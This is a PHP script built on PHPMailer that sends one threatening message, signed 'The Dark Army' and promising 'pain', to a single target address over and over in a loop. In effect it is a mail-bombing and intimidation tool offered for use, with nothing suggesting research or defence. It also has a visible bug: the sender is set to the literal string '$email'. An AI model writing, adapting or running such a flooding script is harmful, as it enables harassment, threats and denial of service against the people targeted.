<?php
require_once ('PHPMailer/PHPMailerAutoload.php');
class main{
	public $mail_server_domain;
	public $mail_server_port;
	public $mail_server_email;
	public $mail_server_password;
	public $mail;
	function __construct($domain, $port, $email, $password){
        $this->mail = new PHPMailer();
		$this->mail_server_domain = $domain;
		$this->mail_server_port = $port;
		$this->mail_server_email = $email;
		$this->mail_server_password = $password;
	}
	function mailStrike($target){
            //Server settings
            //$this->mail->SMTPDebug = 2;                                       // Enable verbose debug output
            $this->mail->isSMTP();                                            // Set mailer to use SMTP
            $this->mail->Host       = $this->mail_server_domain;  // Specify main and backup SMTP servers
            $this->mail->SMTPAuth   = true;                                   // Enable SMTP authentication
            $this->mail->Username   = $this->mail_server_email;                     // SMTP username
            $this->mail->Password   = $this->mail_server_password;                               // SMTP password
            $this->mail->SMTPSecure = 'ssl';                                  // Enable TLS encryption, `ssl` also accepted
            $this->mail->Port       = $this->mail_server_port;                                    // TCP port to connect to
            $this->mail->CharSet = "utf-8";
            $this->mail->setFrom('$email', 'DarkArmy');
            //$mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient
            $this->mail->addAddress($target);               // Name is optional
            //$mail->addReplyTo('info@example.com', 'Information');
            //$mail->addCC('cc@example.com');
            //$mail->addBCC('bcc@example.com');

            // Attachments
            //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
            //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

            // Content
            $this->mail->isHTML(false);                                  // Set email format to HTML
            $this->mail->Subject = "The Dark Army";
            $this->mail->Body    = "The Dark Army is there! You had been warned, but you haven't listen! You will feel the pain of true dark power!";
            //$this->mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

            $this->mail->send();
            //echo 'Message has been sent';
            return true;
	}
	function start($repete, $target){
		for($int=0; $int <= $repete; $int++){
			$this->mailStrike($target);
		}
		//$this->mailStrike($target);
	}
}